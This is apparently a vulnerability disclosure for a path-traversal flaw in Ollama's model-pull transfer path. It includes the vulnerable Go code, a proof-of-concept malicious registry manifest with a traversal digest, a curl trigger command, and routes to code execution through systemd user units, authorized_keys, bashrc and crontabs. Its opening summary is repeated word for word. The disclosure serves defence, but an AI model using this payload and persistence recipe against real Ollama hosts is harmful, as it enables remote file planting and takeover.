## Summary

`pullWithTransfer` (Ollama's fast transfer path for models with tensor layers) passes every layer's `Digest` string, verbatim, into `x/imagegen/transfer.Blob{Digest}`. The transfer package's internal `digestToPath` helper performs only a naive `sha256:` → `sha256-` substitution and never calls `manifest.BlobsPath()`, which is the only function that enforces the `^sha256[:-][0-9a-fA-F]{64}$` regex. A malicious registry can therefore advertise a manifest whose layer `Digest` contains path-traversal components (e.g., `sha256:../../../../../etc/cron.d/pwn`). During the pull, `x/imagegen/transfer/download.go:213-215` calls `os.MkdirAll(filepath.Dir(dest), 0o755)` followed by `os.Create(tmp)`, writing a `.tmp` file at an attacker-chosen path under the ollama service user. For any blob ≥ 64 MB the `.tmp` persists across errors (stall / network failure / context cancel) because the outer cleanup at `download.go:134` only removes when `blob.Size < resumeThreshold`. The directory tree created by `MkdirAll` persists unconditionally.

Remote, unauthenticated reach: a single `POST /api/pull` pointing at an attacker-controlled registry (or a registry that issues a 302 to one) is enough. Trivially upgraded to RCE via `/etc/cron.d/`, `~/.ssh/authorized_keys`, `~/.bashrc`, `~/.config/systemd/user/*.service`, or similar persistence primitives depending on the ollama user (systemd service vs interactive user install).

## Details

`pullWithTransfer` (Ollama's fast transfer path for models with tensor layers) passes every layer's `Digest` string, verbatim, into `x/imagegen/transfer.Blob{Digest}`. The transfer package's internal `digestToPath` helper performs only a naive `sha256:` → `sha256-` substitution and never calls `manifest.BlobsPath()`, which is the only function that enforces the `^sha256[:-][0-9a-fA-F]{64}$` regex. A malicious registry can therefore advertise a manifest whose layer `Digest` contains path-traversal components (e.g., `sha256:../../../../../etc/cron.d/pwn`). During the pull, `x/imagegen/transfer/download.go:213-215` calls `os.MkdirAll(filepath.Dir(dest), 0o755)` followed by `os.Create(tmp)`, writing a `.tmp` file at an attacker-chosen path under the ollama service user. For any blob ≥ 64 MB the `.tmp` persists across errors (stall / network failure / context cancel) because the outer cleanup at `download.go:134` only removes when `blob.Size < resumeThreshold`. The directory tree created by `MkdirAll` persists unconditionally.

Remote, unauthenticated reach: a single `POST /api/pull` pointing at an attacker-controlled registry (or a registry that issues a 302 to one) is enough. Trivially upgraded to RCE via `/etc/cron.d/`, `~/.ssh/authorized_keys`, `~/.bashrc`, `~/.config/systemd/user/*.service`, or similar persistence primitives depending on the ollama user (systemd service vs interactive user install).

### Location

- `server/images.go:720-793` — `pullWithTransfer`
- `server/images.go:724-727` — `blobs[i] = transfer.Blob{Digest: layer.Digest, Size: layer.Size}` (no regex)
- `x/imagegen/transfer/transfer.go:164-170` — `digestToPath`
- `x/imagegen/transfer/download.go:213-215` — `os.MkdirAll(filepath.Dir(dest), 0o755)` + `os.Create(tmp)`
- `x/imagegen/transfer/download.go:134-137` — cleanup gated on `blob.Size < resumeThreshold`

### Attacker Control

Network attacker via malicious registry (or MITM on `http://` pulls when `Insecure=true`) controls:
- manifest JSON contents, including any `Digest` string per layer (no server-side digest charset enforcement)
- layer `Size` field (selecting ≥ 64 MB causes `.tmp` to persist on mid-transfer failure)
- response body for blob fetch (used to trigger stall/cancel for `.tmp` persistence)

Attacker does NOT need: ollama client-side credentials, a real CA-signed TLS cert (if user passes `insecure=true`), prior access to the victim host.

### Trust Boundary Crossed

Network (attacker-controlled registry) → local filesystem (ollama user scope). Directly bypasses `manifest.BlobsPath`'s regex validation, which is the intended gate for this boundary.

### Evidence

```go
// server/images.go:720-728
func pullWithTransfer(ctx context.Context, n model.Name, layers []manifest.Layer, manifestData []byte, regOpts *registryOptions, fn func(api.ProgressResponse)) error {
    blobs := make([]transfer.Blob, len(layers))
    for i, layer := range layers {
        blobs[i] = transfer.Blob{
            Digest: layer.Digest,   // <-- raw, unvalidated
            Size:   layer.Size,
        }
    }
    ...
}

// x/imagegen/transfer/transfer.go:164-170
// digestToPath converts sha256:abc123 to sha256-abc123
func digestToPath(digest string) string {
    if len(digest) > 7 && digest[6] == ':' {
        return digest[:6] + "-" + digest[7:]   // <-- no IsLocal, no regex
    }
    return digest
}

// x/imagegen/transfer/download.go:212-247
func (d *downloader) save(ctx context.Context, blob Blob, r io.Reader, existingSize int64) (int64, error) {
    dest := filepath.Join(d.destDir, digestToPath(blob.Digest))
    tmp := dest + ".tmp"
    os.MkdirAll(filepath.Dir(dest), 0o755)          // side-effectful dir create
    ...
    if existingSize == 0 {
        f, err = os.Create(tmp)                     // write sink
        ...
    }
    ...
}
```

Contrast `manifest.BlobsPath` which enforces the regex:

```go
// manifest/paths.go:40-47
func BlobsPath(digest string) (string, error) {
    pattern := "^sha256[:-][0-9a-fA-F]{64}$"
    re := regexp.MustCompile(pattern)
    if digest != "" && !re.MatchString(digest) {
        return "", ErrInvalidDigestFormat
    }
    ...
}
```

`manifest.BlobsPath` is called only once in `pullWithTransfer` at line 730 (with `""` to get the blobs directory root); it is NEVER invoked for per-layer digest validation on this call chain.

## Root Cause

Validated rationale: pullWithTransfer passes raw layer.Digest into transfer.Blob; digestToPath does strings.Replace with no IsLocal/regex, while Advocate confirmed no blocking protection on this call chain (BlobsPath regex is never invoked by the transfer package).

Primary cited code reference: `server/images.go:720`.

Merge extraction sink line: - `server/images.go:720-793` — `pullWithTransfer`

## Proof of Concept

Merge-normalized status: `executed`.

PoC script present: `poc.py`.

Supporting evidence is present under `evidence/`.

1. Start attacker-controlled HTTP registry at `http://localhost:9001` serving:
   - `GET /v2/evil/foo/manifests/latest` — returns JSON:
     ```json
     {
       "schemaVersion": 2,
       "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
       "layers": [
         {"mediaType":"application/vnd.ollama.image.tensor","digest":"sha256:aaaaaaaa...","size":1},
         {"mediaType":"application/vnd.ollama.image.model","digest":"sha256:../../../../tmp/PWNED_BY_PULL","size":1073741824}
       ]
     }
     ```
   - `GET /v2/evil/foo/blobs/sha256:aaaaaaaa...` — returns 1 byte that matches the tensor digest.
   - `GET /v2/evil/foo/blobs/sha256:../../..` — returns a large (≥ 64 MB) response then stalls.
2. On victim:
   ```
   curl -X POST http://127.0.0.1:11434/api/pull -d '{"name":"localhost:9001/evil/foo:latest","insecure":true}'
   ```
3. Observe `/tmp/PWNED_BY_PULL.tmp` exists after the download errors out.
4. Replace traversal target with `/home/<user>/.config/systemd/user/pwn.service` and appropriate service content to achieve user-level RCE on next `systemctl --user daemon-reload`.

Debate context: Advocate exhaustively searched the 5 protection layers (input validation, struct-tag, `hasTensorLayers` guard, `BlobsPath` regex, `IsLocal`) and found zero mitigations on this path. Tracer confirmed the probe's finding on HEAD `57653b8e`; corrected the probe's overstatement that `.tmp` persists on hash mismatch — on HEAD, `save()` DOES `os.Remove(tmp)` on hash/size mismatch, but network/stall errors still leave the file behind for ≥ 64 MB blobs, and `os.MkdirAll` runs before any check.

## Impact

- Arbitrary directory tree creation (`os.MkdirAll(..., 0o755)`) at any path writable by ollama user.
- Arbitrary `.tmp` file creation (partial content controlled by attacker) persisting on mid-transfer failure for blobs ≥ 64 MB.
- On interactive-user install: drop `~/.bashrc`, `~/.profile`, `~/.config/systemd/user/<name>.service` → next login / `systemctl --user daemon-reload` yields code execution.
- On systemd service install as `ollama` user: `~ollama/.ssh/authorized_keys` accepts public keys; `~ollama/.bashrc` fires on interactive shell to `ollama`. Cron drop-ins under `/etc/cron.d/` are usually root-owned, but `/var/spool/cron/ollama` (user crontab location) may be writable depending on distro.
- DoS via disk exhaustion (unbounded `.tmp` files; `MkdirAll` creates arbitrarily deep trees).

_Synthesized during merge normalization from `archon/findings/C2-pullwithtransfer-digest-path-traversal/draft.md`._
